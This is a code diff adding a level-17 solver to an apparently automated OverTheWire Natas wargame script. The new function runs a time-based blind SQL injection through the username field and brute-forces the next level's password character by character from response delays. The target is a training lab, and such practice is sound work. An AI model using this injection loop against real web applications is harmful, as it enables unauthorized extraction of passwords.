@@ -1,6 +1,6 @@
 import http.client
 import urllib.parse
-import string, re, base64, json
+import string, re, base64, json, time
 
 host = "natas.labs.overthewire.org"
 login = "natas"
@@ -365,6 +365,55 @@ def level16():
     else:
         print(" Password not found")
 
+def level17():
+    u = "username="
+    bs = "natas18\" or 1 = if((select count(*) from users where password like binary \""
+    be = "%\" = 1), sleep(1), null) #"
+    print(" Time-based blind SQL injection {}{}{}".format(u, bs, be))
+    print(" Measure response time: ", end="")
+    m = time.time()
+    res = req(
+        "POST",
+        "/index.php",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        body=u + "test",
+    )
+    m = time.time() - m
+    if res.status != 200: return
+    print("{} sec".format(m))
+    p = ""
+    c = True
+    s = string.ascii_letters + string.digits
+    print(" Bruteforce password: ", end="", flush=True)
+    while c:
+        for i in s:
+            r = urllib.parse.quote("{}{}{}{}".format(bs, p, i, be))
+            t = time.time()
+            res = req(
+                "POST",
+                "/index.php",
+                headers={"Content-Type": "application/x-www-form-urlencoded"},
+                body=u + r,
+            )
+
+            t = time.time() - t
+            if res.status != 200: return
+            if t > m * 2:
+                p += i
+                print(i, end="", flush=True)
+                break
+            else:
+                if i == s[-1]:
+                    c = False
+                    break
+
+    print()
+    if p != "":
+        if len(passwords) == level + 1: passwords.append(p)
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
+        
 def levelN():
     print("Level {} not implemented yet".format(level))
     return
@@ -374,7 +423,7 @@ levels = [
     level4, level5, level6, level7,
     level8, level9, level9, level11,
     level12, level12, level14, level15,
-    level16, levelN, levelN, levelN,
+    level16, level17, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
